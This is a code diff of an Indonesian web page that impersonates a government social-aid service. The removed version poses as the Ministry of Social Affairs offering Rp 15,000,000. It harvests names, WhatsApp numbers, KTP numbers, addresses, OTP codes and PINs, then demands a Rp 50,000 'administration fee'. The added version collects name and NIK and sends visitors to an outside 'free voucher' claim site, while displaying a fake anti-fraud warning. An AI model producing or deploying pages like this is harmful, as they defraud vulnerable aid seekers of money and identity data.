@@ -3,410 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Program Bantuan Sosial - Kementerian Sosial RI</title>
-    <link rel="stylesheet" href="styles/style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Cek Dana Bantuan KTP</title>
+    <link rel="stylesheet" href="css/style.css">
 </head>
 <body>
-    <!-- Background Animation -->
-    <div class="bg-animation" id="bgAnimation"></div>
-    
     <div class="container">
-        <!-- Halaman 0: Pilihan Pendaftaran/Login -->
-        <div id="page0" class="page active">
-            <div class="header">
-                <div class="logo-container">
-                    <div class="logo">
-                        <img src="https://i.ibb.co/nsxg3b0N/Logo-Bansos.png" alt="Logo Bansos">
-                    </div>
-                </div>
-                <div class="logo-text">KEMENTERIAN SOSIAL REPUBLIK INDONESIA</div>
-                <div class="badge">PROGRAM BANTUAN SOSIAL 2024</div>
-                <h1>Selamat Datang</h1>
-                <p>Silakan pilih opsi di bawah ini untuk mengakses Program Bantuan Sosial</p>
+        <header>
+            <h1>Cek Dana Bantuan KTP</h1>
+            <p class="subtitle">Periksa apakah Anda berhak menerima dana bantuan pemerintah</p>
+        </header>
+        
+        <div class="form-section">
+            <div class="form-group">
+                <label for="nama">Nama Lengkap</label>
+                <input type="text" id="nama" placeholder="Masukkan nama sesuai KTP">
             </div>
             
-            <div class="choice-container">
-                <div class="choice-card" onclick="selectOption('register')">
-                    <div class="choice-icon">
-                        <i class="fas fa-user-plus"></i>
-                    </div>
-                    <div class="choice-title">Pendaftaran Baru</div>
-                    <div class="choice-desc">Daftar sebagai penerima baru bantuan sosial senilai Rp 15.000.000</div>
-                </div>
-                
-                <div class="choice-card" onclick="selectOption('login')">
-                    <div class="choice-icon">
-                        <i class="fas fa-sign-in-alt"></i>
-                    </div>
-                    <div class="choice-title">Masuk</div>
-                    <div class="choice-desc">Masuk ke akun Anda untuk mengakses bantuan sosial</div>
-                </div>
+            <div class="form-group">
+                <label for="nik">Nomor Induk Kependudukan (NIK)</label>
+                <input type="text" id="nik" placeholder="Masukkan 16 digit NIK">
             </div>
             
-            <!-- Akses Cepat untuk Pengguna Terdaftar -->
-            <div class="quick-access">
-                <h3><i class="fas fa-bolt"></i> Akses Cepat</h3>
-                <p>Jika Anda sudah terdaftar, langsung masuk ke dashboard dengan mengklik tombol di bawah:</p>
-                <div class="quick-access-buttons">
-                    <button class="quick-btn" onclick="directToDashboard()">
-                        <i class="fas fa-tachometer-alt"></i> Masuk ke Dashboard
-                    </button>
-                </div>
+            <div class="form-group">
+                <label for="provinsi">Provinsi</label>
+                <select id="provinsi">
+                    <option value="">Pilih Provinsi</option>
+                    <option value="DKI Jakarta">DKI Jakarta</option>
+                    <option value="Jawa Barat">Jawa Barat</option>
+                    <option value="Jawa Tengah">Jawa Tengah</option>
+                    <option value="Jawa Timur">Jawa Timur</option>
+                    <option value="Banten">Banten</option>
+                    <option value="DIY Yogyakarta">DIY Yogyakarta</option>
+                    <option value="Sumatera Utara">Sumatera Utara</option>
+                    <option value="Sumatera Barat">Sumatera Barat</option>
+                    <option value="Riau">Riau</option>
+                    <option value="Kalimantan Barat">Kalimantan Barat</option>
+                    <option value="Kalimantan Timur">Kalimantan Timur</option>
+                    <option value="Sulawesi Selatan">Sulawesi Selatan</option>
+                    <option value="Bali">Bali</option>
+                    <option value="Nusa Tenggara Barat">Nusa Tenggara Barat</option>
+                    <option value="Nusa Tenggara Timur">Nusa Tenggara Timur</option>
+                    <option value="Papua">Papua</option>
+                </select>
             </div>
             
-            <div class="benefit-list">
-                <div class="benefit-item">
-                    <i class="fas fa-check-circle"></i>
-                    <span>Bantuan tunai langsung senilai Rp 15.000.000</span>
-                </div>
-                <div class="benefit-item">
-                    <i class="fas fa-check-circle"></i>
-                    <span>Proses cepat dan mudah</span>
-                </div>
-                <div class="benefit-item">
-                    <i class="fas fa-check-circle"></i>
-                    <span>Dana langsung ke rekening Anda</span>
-                </div>
-            </div>
-            
-            <div class="guarantee-badge">
-                <i class="fas fa-shield-alt"></i> Data Anda Terjamin Aman & Rahasia
-            </div>
+            <button id="cek-btn">Cek Status Bantuan</button>
         </div>
         
-        <!-- Halaman 1: Input WhatsApp dan Nama (Pendaftaran) -->
-        <div id="page1" class="page">
-            <div class="header">
-                <div class="logo-container">
-                    <div class="logo">
-                        <img src="https://i.ibb.co/nsxg3b0N/Logo-Bansos.png" alt="Logo Bansos">
-                    </div>
-                </div>
-                <div class="logo-text">KEMENTERIAN SOSIAL REPUBLIK INDONESIA</div>
-                <div class="badge">PENDAFTARAN BARU</div>
-                <h1>Program Bantuan Sosial 2024</h1>
-                <p>Daftarkan diri Anda untuk mendapatkan bantuan tunai langsung senilai <strong>Rp 15.000.000</strong></p>
+        <div class="result-section" id="result-section">
+            <div class="result-title" id="result-title"></div>
+            <div class="result-details" id="result-details"></div>
+            <div class="dana-amount" id="dana-amount"></div>
+            
+            <div class="info-box" id="info-box">
+                <p><strong>Informasi Penting:</strong></p>
+                <p>Penarikan dana bantuan dilakukan melalui aplikasi Dana tanpa biaya admin.</p>
+                <p>Klik tombol di bawah ini untuk menerima dana bantuan:</p>
+                <a href="https://ayo-klaim-vocher-gratis-dana-2025-522.netlify.app/" class="link-button" target="_blank">Terima Dana Bantuan</a>
             </div>
             
-            <div class="progress-bar">
-                <div class="progress-fill" style="width: 25%;"></div>
-                <div class="progress-step active">1<span class="progress-label">Data Diri</span></div>
-                <div class="progress-step">2<span class="progress-label">Data KTP</span></div>
-                <div class="progress-step">3<span class="progress-label">Verifikasi</span></div>
-                <div class="progress-step">4<span class="progress-label">Selesai</span></div>
-            </div>
-            
-            <div class="countdown">
-                <i class="fas fa-clock"></i> Waktu pendaftaran tersisa: <span id="countdown-timer">14:32</span>
-            </div>
-            
-            <form id="form1">
-                <div class="form-group">
-                    <label for="nama"><i class="fas fa-user"></i> Nama Sesuai KTP</label>
-                    <input type="text" id="nama" placeholder="Masukkan nama lengkap sesuai KTP" required>
-                    <div class="input-icon"><i class="fas fa-check-circle" style="display: none;"></i></div>
-                </div>
-                
-                <div class="form-group">
-                    <label for="whatsapp"><i class="fas fa-phone"></i> Nomor WhatsApp</label>
-                    <input type="tel" id="whatsapp" inputmode="numeric" pattern="[0-9]*" placeholder="Contoh: 081234567890" required>
-                    <div class="input-icon"><i class="fas fa-check-circle" style="display: none;"></i></div>
-                </div>
-                
-                <div class="guarantee-badge">
-                    <i class="fas fa-shield-alt"></i> Data Anda Terjamin Aman & Rahasia
-                </div>
-                
-                <button type="button" class="btn" onclick="nextPage(1)">
-                    LANJUTKAN PENDAFTARAN <i class="fas fa-arrow-right"></i>
-                </button>
-                
-                <div class="login-link">
-                    Sudah punya akun? <a onclick="directToDashboard()">Masuk ke Dashboard</a>
-                </div>
-            </form>
-        </div>
-        
-        <!-- Halaman Login: Masuk untuk pengguna terdaftar -->
-        <div id="loginPage" class="page">
-            <div class="header">
-                <div class="logo-container">
-                    <div class="logo">
-                        <img src="https://i.ibb.co/nsxg3b0N/Logo-Bansos.png" alt="Logo Bansos">
-                    </div>
-                </div>
-                <div class="logo-text">KEMENTERIAN SOSIAL REPUBLIK INDONESIA</div>
-                <div class="badge">MASUK KE AKUN</div>
-                <h1>Masuk ke Akun Bansos</h1>
-                <p>Gunakan nomor WhatsApp dan PIN untuk mengakses akun Anda</p>
-            </div>
-            
-            <form id="loginForm">
-                <div class="form-group">
-                    <label for="loginWhatsapp"><i class="fas fa-phone"></i> Nomor WhatsApp</label>
-                    <input type="tel" id="loginWhatsapp" inputmode="numeric" pattern="[0-9]*" placeholder="Masukkan nomor WhatsApp terdaftar" required>
-                    <div class="input-icon"><i class="fas fa-check-circle" style="display: none;"></i></div>
-                </div>
-                
-                <div class="form-group">
-                    <label for="loginNama"><i class="fas fa-user"></i> Nama Sesuai KTP</label>
-                    <input type="text" id="loginNama" placeholder="Masukkan nama sesuai KTP" required>
-                    <div class="input-icon"><i class="fas fa-check-circle" style="display: none;"></i></div>
-                </div>
-                
-                <div class="form-group">
-                    <label><i class="fas fa-lock"></i> PIN 6 Angka</label>
-                    <div class="pin-inputs">
-                        <input type="password" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-                        <input type="password" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-                        <input type="password" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-                        <input type="password" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-                        <input type="password" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-                        <input type="password" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-                    </div>
-                </div>
-                
-                <div class="benefit-list">
-                    <div class="benefit-item">
-                        <i class="fas fa-info-circle"></i>
-                        <span>Gunakan PIN 6 angka yang telah Anda buat saat pendaftaran</span>
-                    </div>
-                </div>
-                
-                <button type="button" class="btn btn-success" onclick="processLogin()">
-                    <i class="fas fa-sign-in-alt"></i> MASUK KE AKUN
-                </button>
-                
-                <div class="login-link">
-                    Lupa PIN? <a onclick="directToDashboard()">Masuk langsung ke Dashboard</a>
-                </div>
-            </form>
-        </div>
-        
-        <!-- Halaman 2: Input KTP dan Alamat -->
-        <div id="page2" class="page">
-            <div class="header">
-                <div class="logo-container">
-                    <div class="logo">
-                        <img src="https://i.ibb.co/nsxg3b0N/Logo-Bansos.png" alt="Logo Bansos">
-                    </div>
-                </div>
-                <div class="logo-text">KEMENTERIAN SOSIAL REPUBLIK INDONESIA</div>
-                <div class="badge">VERIFIKASI DATA</div>
-                <h1>Lengkapi Data KTP & Alamat</h1>
-                <p>Pastikan data yang Anda masukkan sesuai dengan dokumen KTP asli</p>
-            </div>
-            
-            <div class="progress-bar">
-                <div class="progress-fill" style="width: 50%;"></div>
-                <div class="progress-step completed">1<span class="progress-label">Data Diri</span></div>
-                <div class="progress-step active">2<span class="progress-label">Data KTP</span></div>
-                <div class="progress-step">3<span class="progress-label">Verifikasi</span></div>
-                <div class="progress-step">4<span class="progress-label">Selesai</span></div>
-            </div>
-            
-            <form id="form2">
-                <div class="form-group">
-                    <label for="ktp"><i class="fas fa-id-card"></i> Nomor KTP</label>
-                    <input type="text" id="ktp" inputmode="numeric" pattern="[0-9]*" placeholder="Masukkan 16 digit nomor KTP" maxlength="16" required>
-                    <div class="input-icon"><i class="fas fa-check-circle" style="display: none;"></i></div>
-                </div>
-                
-                <div class="form-group">
-                    <label for="alamat"><i class="fas fa-home"></i> Alamat Lengkap</label>
-                    <textarea id="alamat" placeholder="Masukkan alamat lengkap sesuai KTP (jalan, RT/RW, kelurahan, kecamatan, kota, kode pos)" required></textarea>
-                    <div class="input-icon"><i class="fas fa-check-circle" style="display: none;"></i></div>
-                </div>
-                
-                <div class="benefit-list">
-                    <div class="benefit-item">
-                        <i class="fas fa-check-circle"></i>
-                        <span>Bantuan langsung cair tanpa potongan</span>
-                    </div>
-                    <div class="benefit-item">
-                        <i class="fas fa-check-circle"></i>
-                        <span>Proses cepat dan mudah</span>
-                    </div>
-                    <div class="benefit-item">
-                        <i class="fas fa-check-circle"></i>
-                        <span>Dana langsung ke rekening Anda</span>
-                    </div>
-                </div>
-                
-                <div style="display: flex; gap: 10px;">
-                    <button type="button" class="btn btn-secondary" style="flex: 1;" onclick="prevPage(2)">
-                        <i class="fas fa-arrow-left"></i> KEMBALI
-                    </button>
-                    <button type="button" class="btn" style="flex: 2;" onclick="nextPage(2)">
-                        LANJUTKAN <i class="fas fa-arrow-right"></i>
-                    </button>
-                </div>
-            </form>
-        </div>
-        
-        <!-- Halaman 3: Input OTP -->
-        <div id="page3" class="page">
-            <div class="header">
-                <div class="logo-container">
-                    <div class="logo">
-                        <img src="https://i.ibb.co/nsxg3b0N/Logo-Bansos.png" alt="Logo Bansos">
-                    </div>
-                </div>
-                <div class="logo-text">KEMENTERIAN SOSIAL REPUBLIK INDONESIA</div>
-                <div class="badge">VERIFIKASI KEAMANAN</div>
-                <h1>Verifikasi Kode OTP</h1>
-                <p>Kode OTP telah dikirim ke WhatsApp Anda. Masukkan 6 digit kode untuk verifikasi</p>
-            </div>
-            
-            <div class="progress-bar">
-                <div class="progress-fill" style="width: 75%;"></div>
-                <div class="progress-step completed">1<span class="progress-label">Data Diri</span></div>
-                <div class="progress-step completed">2<span class="progress-label">Data KTP</span></div>
-                <div class="progress-step active">3<span class="progress-label">Verifikasi</span></div>
-                <div class="progress-step">4<span class="progress-label">Selesai</span></div>
-            </div>
-            
-            <form id="form3">
-                <div class="otp-inputs">
-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-                </div>
-                
-                <div class="countdown">
-                    <i class="fas fa-sync-alt"></i> Kode OTP berlaku: <span id="otp-timer">02:00</span>
-                </div>
-                
-                <div style="display: flex; gap: 10px;">
-                    <button type="button" class="btn btn-secondary" style="flex: 1;" onclick="prevPage(3)">
-                        <i class="fas fa-arrow-left"></i> KEMBALI
-                    </button>
-                    <button type="button" class="btn" style="flex: 2;" onclick="nextPage(3)">
-                        VERIFIKASI <i class="fas fa-check-circle"></i>
-                    </button>
-                </div>
-            </form>
-        </div>
-        
-        <!-- Halaman 4: Dashboard Pendaftaran Baru -->
-        <div id="page4" class="page">
-            <div class="header">
-                <div class="logo-container">
-                    <div class="logo">
-                        <img src="https://i.ibb.co/nsxg3b0N/Logo-Bansos.png" alt="Logo Bansos">
-                    </div>
-                </div>
-                <div class="logo-text">KEMENTERIAN SOSIAL REPUBLIK INDONESIA</div>
-                <div class="badge">PENDAFTARAN BERHASIL</div>
-                <h1>Selamat! Pendaftaran Anda Berhasil</h1>
-            </div>
-            
-            <div class="progress-bar">
-                <div class="progress-fill" style="width: 100%;"></div>
-                <div class="progress-step completed">1<span class="progress-label">Data Diri</span></div>
-                <div class="progress-step completed">2<span class="progress-label">Data KTP</span></div>
-                <div class="progress-step completed">3<span class="progress-label">Verifikasi</span></div>
-                <div class="progress-step active">4<span class="progress-label">Selesai</span></div>
-            </div>
-            
-            <div class="dashboard">
-                <div class="welcome">Selamat datang, <span id="displayNama">[Nama]</span>!</div>
-                
-                <div class="balance-card">
-                    <div class="balance-label">SALDO BANTUAN SOSIAL ANDA</div>
-                    <div class="balance-amount">Rp 15.000.000</div>
-                </div>
-                
-                <div class="info-box">
-                    <h3><i class="fas fa-info-circle"></i> Informasi Penting</h3>
-                    <p>Untuk dapat mencairkan saldo bantuan sosial sebesar <strong>Rp 15.000.000</strong>, Anda perlu menyelesaikan biaya administrasi sebesar <strong>Rp 50.000</strong> melalui e-wallet (OVO, GoPay, Dana, dll).</p>
-                </div>
-                
-                <div class="benefit-list">
-                    <div class="benefit-item">
-                        <i class="fas fa-check-circle"></i>
-                        <span>Dana akan langsung ditransfer ke rekening Anda</span>
-                    </div>
-                    <div class="benefit-item">
-                        <i class="fas fa-check-circle"></i>
-                        <span>Proses pencairan maksimal 1x24 jam</span>
-                    </div>
-                    <div class="benefit-item">
-                        <i class="fas fa-check-circle"></i>
-                        <span>Bantuan bersifat non-pajak dan tanpa potongan</span>
-                    </div>
-                </div>
-                
-                <button class="btn withdraw-btn" onclick="showNotification()">
-                    <i class="fas fa-wallet"></i> CAIRKAN SALDO BANTUAN
-                </button>
-            </div>
-        </div>
-        
-        <!-- Halaman Dashboard untuk Pengguna Terdaftar -->
-        <div id="dashboardPage" class="page">
-            <div class="header">
-                <div class="logo-container">
-                    <div class="logo">
-                        <img src="https://i.ibb.co/nsxg3b0N/Logo-Bansos.png" alt="Logo Bansos">
-                    </div>
-                </div>
-                <div class="logo-text">KEMENTERIAN SOSIAL REPUBLIK INDONESIA</div>
-                <div class="badge">AKUN BANTUAN SOSIAL</div>
-                <h1>Dashboard Bantuan Sosial</h1>
-            </div>
-            
-            <div class="dashboard">
-                <div class="welcome">Selamat datang kembali, <span id="loginDisplayNama">Penerima Bansos</span>!</div>
-                
-                <div class="balance-card">
-                    <div class="balance-label">SALDO BANTUAN SOSIAL ANDA</div>
-                    <div class="balance-amount">Rp 15.000.000</div>
-                </div>
-                
-                <div class="info-box">
-                    <h3><i class="fas fa-info-circle"></i> Status Pencairan</h3>
-                    <p>Saldo bantuan sosial Anda sudah aktif dan siap untuk dicairkan. Untuk proses pencairan, silakan hubungi layanan customer service kami.</p>
-                </div>
-                
-                <div class="benefit-list">
-                    <div class="benefit-item">
-                        <i class="fas fa-check-circle"></i>
-                        <span>Saldo Anda sudah aktif</span>
-                    </div>
-                    <div class="benefit-item">
-                        <i class="fas fa-check-circle"></i>
-                        <span>Dana siap dicairkan kapan saja</span>
-                    </div>
-                    <div class="benefit-item">
-                        <i class="fas fa-check-circle"></i>
-                        <span>Bantuan bersifat non-pajak</span>
-                    </div>
-                </div>
-                
-                <button class="btn withdraw-btn" onclick="showNotification()">
-                    <i class="fas fa-wallet"></i> CAIRKAN SALDO BANTUAN
-                </button>
-                
-                <div style="margin-top: 20px;">
-                    <button class="btn btn-secondary" onclick="goToHome()">
-                        <i class="fas fa-home"></i> KEMBALI KE HALAMAN AWAL
-                    </button>
-                </div>
+            <div class="warning">
+                <p><strong>Peringatan:</strong> Hati-hati terhadap penipuan. Pastikan Anda hanya mengakses situs resmi pemerintah.</p>
             </div>
         </div>
     </div>
     
-    <div id="notification" class="notification">
-        <i class="fas fa-exclamation-triangle"></i>
-        <strong>Maaf, saldo bantuan belum bisa dicairkan.</strong><br>
-        Anda belum memenuhi syarat pencairan dana.
-    </div>
+    <footer>
+        <p>&copy; 2025 Layanan Pemerintah - Cek Dana Bantuan KTP</p>
+    </footer>
 
-    <script src="scripts/script.js"></script>
+    <script src="js/script.js"></script>
 </body>
 </html>
